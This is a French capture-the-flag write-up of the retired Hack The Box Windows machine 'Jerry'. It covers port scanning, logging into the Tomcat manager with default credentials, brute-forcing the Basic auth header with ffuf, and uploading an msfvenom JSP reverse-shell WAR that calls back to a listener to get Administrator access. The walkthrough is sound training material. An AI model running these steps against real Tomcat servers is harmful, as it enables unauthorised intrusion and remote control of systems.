Nouvelle box windows (retirée) easy : Jerry.

COmme d'habitude, nous commençons par scanner les ports les plus courant 
```sh
sudo nmap -sV -sC -p- -oA jerry 10.10.10.95
<SNIP>
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
<SNIP>
```

On remarque qu'il n'y a qu'un seul port d'ouvert, le 8080, un port HTTP pour le service Apache Tomcat, un webserver.

Si on va sur la page http:// 10.10.10.95:8080, on a simplement la page de base de tomcat.


![j1](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/Jerry1.PNG)

En essayant d'aller sur l'onglet, Manager App, on nous demande un mot de passe.

On essaye n'importe quoi et on se retrouve avec une erreur 401.


Cette erreur 401 nous retourne une page, et nous dit que pour accéder à la page, on peut mettre tel tomcat et s3cret, qui sotn des mots de passe par défaut :

![j1](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry2.PNG)

On essaye donc "tomcat" et "s3cret". Et on tombe sur la page d'administration (!!).

![j3](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry3.PNG)

On peut tenter également d'arriver différemment sur cette page, car lorsqu'on ouvre les échanges réseaux de la fenêtre dév de firefox par exemple, on voit que les crédits d'autorisation sont encodés en base64 :

![j4](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry4.PNG)

```sh
echo dG9tY2F0OnMzY3JldA== | base64 -d
tomcat:s3cret
```

On peut donc tenter de brute-force ce champ, avec une liste de user:mdp, grâce à la fabuleuse Seclist :

```
ffuf -w ~/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt:FUZZ -u http://10.10.10.95:8080/manager/html -H 'Authorization: Basic FUZZ' | grep 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.95:8080/manager/html
 :: Wordlist         : FUZZ: /home/kali/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt
 :: Header           : Authorization: Basic FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

dG9tY2F0OnMzY3JldA==    [Status: 200, Size: 17035, Words: 1119, Lines: 380, Duration: 219ms]
dG9tY2F0OnMzY3JldA==    [Status: 200, Size: 17035, Words: 1119, Lines: 380, Duration: 238ms]
:: Progress: [79/79] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/HTB/Jerry]
└─$ echo dG9tY2F0OnMzY3JldA== | base64 -d
tomcat:s3cret                                                                      
```

On voit qu'on peut upload des fichiers war. Grâce au générateur de payload de metasploit, msfvenom, on peut générer un shell inversé :

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=4242 -f war -o payload.war
```


Ensuite on prépare un netcat afin d'écouter les connexions entrantes sur le port 4242 :

```sh
nc -lnvp 4242
```

On upload le fichier, on clique dessus :

![j5](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry5.PNG)


Et on accès à la machine windows via nc. En cherchant, on trouve un dossier des flags sur le Bureau de l'administrateur (on est déjà admin) :

```powershell
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
<SNIP>

root.txt
<SNIP>
C:\Users\Administrator\Desktop\flags>
```

## Conclusion :

Je ne connais pas bien encore les serveurs windows et la façon de les pénétrer, mais cette box, à la fois similaire dans l'approche "web" qu'une machine linux, et extrêmement simple sur le côté "windows", permet de doucement commencer à comprendre un peu mieux comment ça fonctionne.

D'autres approches plus complexes, comme celle Ippsec sur youtube (et qui ne sera pas détaillée ici), sont aussi de très bons moyens de découvrir toutes les faces d'un même challenge et d'améliorer ses process d'approche et d'exécution.

C'est une nécessité, tant windows est courant, que ce soit pour le côté administration ou, comme on vient de le voir, les tests de pénétration.


